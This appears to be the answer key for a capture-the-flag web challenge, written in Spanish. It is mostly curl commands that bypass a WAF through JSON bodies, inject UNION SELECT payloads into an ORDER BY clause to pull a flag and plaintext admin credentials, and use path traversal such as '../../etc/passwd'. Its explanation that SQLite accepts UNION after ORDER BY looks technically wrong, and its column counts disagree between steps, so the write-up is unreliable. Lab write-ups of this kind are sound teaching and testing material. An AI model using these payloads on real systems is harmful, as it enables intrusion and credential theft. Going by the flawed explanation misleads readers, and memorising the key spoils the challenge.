# Solution: web-sqli-chain

## Vulnerability Chain

1. **WAF bypass via JSON body** - El WAF inspecciona query params y form data pero NO el JSON body.
   El endpoint `/api/orders` (y `/orders` con `Content-Type: application/json`) lee el campo `sort`
   del JSON body, que nunca pasa por el WAF.
2. **SQLi en ORDER BY** - El parametro `sort` se concatena directamente en `ORDER BY {sort}`.
   Usando UNION SELECT se pueden extraer datos de cualquier tabla.
3. **Flag en tabla `flags`** - La flag se almacena en la tabla `flags` como `flag_value`.

## Paso 1: Confirmacion de la vulnerabilidad

Primero intentar con query param (WAF lo bloquea):

```bash
# Esto sera bloqueado por el WAF
curl -b "session=..." "http://TARGET:8080/orders?sort=id%20UNION%20SELECT%201,2,3,4,5,6,7"
# Respuesta: {"error": "WAF: Suspicious request blocked", ...}
```

## Paso 2: Login para obtener cookie de sesion

```bash
curl -c cookies.txt -X POST http://TARGET:8080/login \
  -d "username=user1&password=User1pass" -L
```

## Paso 3: WAF bypass con JSON body — extraer flag directamente

```bash
curl -b cookies.txt -X POST http://TARGET:8080/api/orders \
  -H "Content-Type: application/json" \
  -d '{"sort": "id UNION SELECT flag_value,2,3,4,5,6 FROM flags--"}'
```

Respuesta esperada:
```json
{
  "orders": [
    {"id": "HL4{...}", "customer": "2", "product": "3", ...},
    ...pedidos reales...
  ],
  "sort": "id UNION SELECT flag_value,2,3,4,5,6 FROM flags--"
}
```

La flag aparece en el campo `id` del primer resultado.

## Alternativa: extraer credenciales de admin primero

```bash
# Extraer usuarios y contrasenas
curl -b cookies.txt -X POST http://TARGET:8080/api/orders \
  -H "Content-Type: application/json" \
  -d '{"sort": "id UNION SELECT username||\":\"||password||\":\"||role,2,3,4,5,6 FROM users--"}'
```

Resultado incluira: `admin:Admin@2024!:admin`

```bash
# Login como admin
curl -c admin_cookies.txt -X POST http://TARGET:8080/login \
  -d "username=admin&password=Admin%402024!" -L

# Generar backup del admin (incluye tabla flags en el archivo)
curl -b admin_cookies.txt -X POST http://TARGET:8080/admin/backup \
  -d "path=/app/backups/dump.sql"

# Descargar backup y ver la flag
curl -b admin_cookies.txt "http://TARGET:8080/admin/backup/download?file=dump.sql"
```

## Por que funciona el bypass

El WAF usa `re.search(pattern, value, re.IGNORECASE)` sobre `request.args` y `request.form`,
pero cuando el `Content-Type` es `application/json`, Flask parsea el body con `request.get_json()`.
El WAF no inspecciona `request.json`, solo los parametros de URL y form data.

SQLite acepta `UNION SELECT` en la clausula `ORDER BY` cuando la consulta completa tiene
subqueries: `ORDER BY id UNION SELECT ... FROM flags` devuelve las filas de UNION.

## Notas adicionales

- La funcion de backup del admin escribe a una ruta controlada por el usuario (path traversal).
- El endpoint `/admin/backup/download?file=` tambien tiene path traversal: `?file=../../etc/passwd`.
